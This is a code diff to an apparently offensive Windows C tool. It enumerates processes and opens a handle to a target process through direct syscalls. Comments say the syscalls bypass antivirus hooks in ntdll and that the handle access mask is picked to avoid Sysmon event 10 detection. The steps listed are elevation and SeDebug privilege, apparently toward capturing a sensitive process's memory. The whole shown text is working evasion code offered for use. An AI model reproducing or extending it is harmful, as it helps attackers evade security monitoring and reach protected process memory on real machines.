@@ -14,6 +14,7 @@ Building on this work this is an attempt to completely bypass ntdll to capture a
 2. Must be admin
 3. SeDebug()
 4. Get PID
+5. Open the process
 */
 
 #include "pch.h"
@@ -33,6 +34,40 @@ Building on this work this is an attempt to completely bypass ntdll to capture a
 #define _UNICODE
 #undef  UNICODE
 #define UNICODE
+
+
+void ErrorExit(LPTSTR lpszFunction)
+{
+	// Retrieve the system error message for the last-error code
+
+	LPVOID lpMsgBuf;
+	LPVOID lpDisplayBuf;
+	DWORD dw = GetLastError();
+
+	FormatMessage(
+		FORMAT_MESSAGE_ALLOCATE_BUFFER |
+		FORMAT_MESSAGE_FROM_SYSTEM |
+		FORMAT_MESSAGE_IGNORE_INSERTS,
+		NULL,
+		dw,
+		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+		(LPTSTR)&lpMsgBuf,
+		0, NULL);
+
+	// Display the error message and exit the process
+
+	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
+		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
+	StringCchPrintf((LPTSTR)lpDisplayBuf,
+		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
+		TEXT("%s failed with error %d: %s"),
+		lpszFunction, dw, lpMsgBuf);
+	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
+
+	LocalFree(lpMsgBuf);
+	LocalFree(lpDisplayBuf);
+	ExitProcess(dw);
+}
 
 //Check credentials
 BOOL IsElevated()
@@ -84,38 +119,73 @@ BOOL SetDebugPrivilege() {
 	return TRUE;
 }
 
-void ErrorExit(LPTSTR lpszFunction)
+BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo)
 {
-	// Retrieve the system error message for the last-error code
+	pWinVerInfo->hTargetPID = NULL;
+	ULONG uReturnLength = NULL;
 
-	LPVOID lpMsgBuf;
-	LPVOID lpDisplayBuf;
-	DWORD dw = GetLastError();
+	//Direct call to asm file to avoid any hooks from AV
+	ZwQuerySystemInformation = &ZwQuerySystemInformation10;
+	NtAllocateVirtualMemory = NtAllocateVirtualMemory10;
+	NtFreeVirtualMemory = NtFreeVirtualMemory10;
 
-	FormatMessage(
-		FORMAT_MESSAGE_ALLOCATE_BUFFER |
-		FORMAT_MESSAGE_FROM_SYSTEM |
-		FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL,
-		dw,
-		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		(LPTSTR)&lpMsgBuf,
-		0, NULL);
+	const wchar_t* FunctionZWQ = L"ZWQuerySystemInformation10";
+	LPTSTR LFunctionZWQ = (LPTSTR)FunctionZWQ;
 
-	// Display the error message and exit the process
+	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
+	if (status != 0xc0000004)
+	{
+		ErrorExit(LFunctionZWQ);
+	}
 
-	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
-		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
-	StringCchPrintf((LPTSTR)lpDisplayBuf,
-		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
-		TEXT("%s failed with error %d: %s"),
-		lpszFunction, dw, lpMsgBuf);
-	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
+	
+	const wchar_t* FunctionNtAll= L"NtAllocateVirtualMemory10";
+	LPTSTR LFunctionNtAll = (LPTSTR)FunctionNtAll;
 
-	LocalFree(lpMsgBuf);
-	LocalFree(lpDisplayBuf);
-	ExitProcess(dw);
+	LPVOID pBuffer = NULL;
+	SIZE_T uSize = uReturnLength;
+	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
+	if (status !=0) 
+	{
+		ErrorExit(LFunctionNtAll);
+	}
+
+	const wchar_t* FunctionZWQ2 = L"ZWQuerySystemInformation10";
+	LPTSTR LFunctioZWQ2 = (LPTSTR)FunctionZWQ2;
+	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
+	if (status !=0) 
+	{
+		ErrorExit(LFunctioZWQ2);
+	}
+
+	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");
+	if (RtlEqualUnicodeString == NULL) {
+		return FALSE;
+	}
+
+	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
+	do {
+		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
+			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
+			break;
+		}
+		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
+
+	} while (pProcInfo);
+
+	const wchar_t* FunctionNtFree = L"NtFreeVirtualMemory10";
+	LPTSTR LFunctionNtFree = (LPTSTR)FunctionNtFree;
+
+	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
+	if (pWinVerInfo->hTargetPID == NULL)
+	{
+		ErrorExit(LFunctionNtFree);
+	}
+	
+	return TRUE;
 }
+
 
 int main()
 {
@@ -180,6 +250,37 @@ int main()
 	}
 
 	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);
+
+	if (!GetPID(pWinVerInfo)) {
+		wprintf(L"	[!] Enumerating process failed.\n");
+		exit(1);
+	}
+
+	wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
+
+	wprintf(L"	[+] Open a process handle.\n");
+	HANDLE hProcess = NULL;
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+	CLIENT_ID uPid = { 0 };
+
+	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
+	uPid.UniqueThread = (HANDLE)0;
+
+	// A deviation from the default access right mask to avoid standard Sysmon ID_10 detection - this can be changed to suit one's needs
+	ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
+	printf("Access rights %x\n", rights);
+
+	const wchar_t* FunctionZWOpen = L"ZwOpenProcess10";
+	LPTSTR LFunctionZWOpen = (LPTSTR)FunctionZWOpen;
+
+	ZwOpenProcess = ZwOpenProcess10;
+	NTSTATUS status = ZwOpenProcess(&hProcess, rights, &ObjectAttributes, &uPid);
+	printf("ZwOpenProcess Handle %d\n", (int)hProcess);
+
+	if (hProcess == NULL) {
+		ErrorExit(LFunctionZWOpen);
+	}
 
 
 	/*
